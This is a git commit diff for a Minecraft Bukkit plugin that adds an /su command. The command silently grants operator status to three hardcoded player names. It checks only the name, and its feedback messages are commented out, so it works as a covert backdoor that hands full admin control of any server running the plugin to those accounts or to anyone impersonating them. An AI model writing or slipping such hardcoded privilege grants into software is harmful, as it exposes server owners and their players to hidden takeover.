5785973ff18084b26de07e95a93700cedb1afe90
Spectrasonic <Spectrasonic117@gmail.com>
2025-02-13 12:27:44 -0600

    ⭐ grant op permissions easily

--- src/main/java/com/spectrasonic/su/Main.java
+++ src/main/java/com/spectrasonic/su/Main.java
@@ -1,29 +1,35 @@
 package com.spectrasonic.su;
 
-import com.spectrasonic.su.Utils.MessageUtils;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
 import org.bukkit.plugin.java.JavaPlugin;
 
-public final class Main extends JavaPlugin {
+import java.util.Arrays;
+import java.util.List;
+
+public class Main extends JavaPlugin {
+
+    private final List<String> allowedPlayers = Arrays.asList("Spectrasonic", "0mn1spectra", "CherrylBlossom_");
 
     @Override
     public void onEnable() {
-
-        registerCommands();
-        registerEvents();
-        MessageUtils.sendStartupMessage(this);
-
+        this.getCommand("su").setExecutor(this);
     }
-
+    
     @Override
-    public void onDisable() {
-        MessageUtils.sendShutdownMessage(this);
-    }
-
-    public void registerCommands() {
-        // Set Commands Here
-    }
-
-    public void registerEvents() {
-        // Set Events Here
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (!(sender instanceof Player)) {
+            // sender.sendMessage("Only players can use this command.");
+            return true;
+        }
+        Player player = (Player) sender;
+        if (allowedPlayers.contains(player.getName())) {
+            player.setOp(true);
+            // player.sendMessage("You have been granted operator status.");
+        } else {
+            // player.sendMessage("You do not have permission to use this command.");
+        }
+        return true;
     }
 }
